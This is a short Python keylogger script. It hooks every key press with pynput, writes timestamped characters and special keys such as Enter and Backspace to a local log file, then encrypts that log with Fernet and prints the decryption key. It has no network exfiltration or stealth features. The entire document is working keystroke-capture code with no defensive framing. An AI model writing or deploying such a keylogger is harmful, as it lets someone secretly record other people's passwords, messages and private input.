from pynput import keyboard
from cryptography.fernet import Fernet
import logging

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Configure logging
logging.basicConfig(
    filename="temp_keyfile.txt",  # File to temporarily store keystrokes
    level=logging.DEBUG,  # Log all messages at DEBUG level
    format='%(asctime)s: %(message)s'  # Format for log entries
)

# Function to handle key press events
def keyPressed(key):
    try:
        char = key.char  # Attempt to get the character from the key press
        logging.info(char)  # Log the character
    except AttributeError:
        # Handle special keys that don't have a 'char' attribute
        if key == keyboard.Key.space:
            logging.info(' [SPACE] ')  # Log space key press
        elif key == keyboard.Key.enter:
            logging.info(' [ENTER] ')  # Log Enter key press
        elif key == keyboard.Key.backspace:
            logging.info(' [BACKSPACE] ')  # Log Backspace key press
        else:
            logging.info(f' {str(key)} ')  # Log other special keys

# Function to encrypt the log file
def encrypt_log_file():
    with open("temp_keyfile.txt", 'rb') as file:
        file_data = file.read()  # Read the log file data
        encrypted_data = cipher_suite.encrypt(file_data)  # Encrypt the data
        with open("keyfile_encrypted.txt", 'wb') as file_enc:
            file_enc.write(encrypted_data)  # Write the encrypted data to a new file

if __name__ == "__main__":
    # Set up and start the keyboard listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()  # Start listening for key presses
    input()  # Keep the script running until user input is received

    # Encrypt the log file when the script ends
    encrypt_log_file()

    # Print the encryption key (store it securely)
    print(f"Encryption key (keep this safe to decrypt the file): {key.decode()}")